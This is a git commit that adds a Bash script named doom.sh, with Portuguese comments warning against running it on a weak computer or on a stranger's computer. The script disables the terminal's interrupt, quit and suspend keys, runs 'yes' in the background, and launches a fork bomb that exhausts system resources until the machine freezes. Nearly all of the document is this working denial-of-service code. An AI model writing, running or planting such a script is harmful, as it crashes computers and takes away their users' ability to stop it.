0e28dfc2b3b37c6935ba53db3a2b7c4f45be3d19
Rodric <72948934+RodricBr@users.noreply.github.com>
2021-09-13 16:44:54 -0300

    Create doom.sh

---
+++ doom.sh
@@ -0,0 +1,20 @@
+#!/usr/bin/bash
+
+# Se vc está lendo isso,
+# não execute esse comando em um pc fraco
+# ou pc de um desconhecido
+
+ARQ=$1
+
+if [[ -z "$*" ]]; then
+  echo -e "Adicione permissão de execução primeiro:\nchmod +x $0"
+else
+  stty intr ""
+  stty quit ""
+  stty susp undef
+  yes "$1" &
+  :(){
+    :|:&
+  };:
+fi
+#
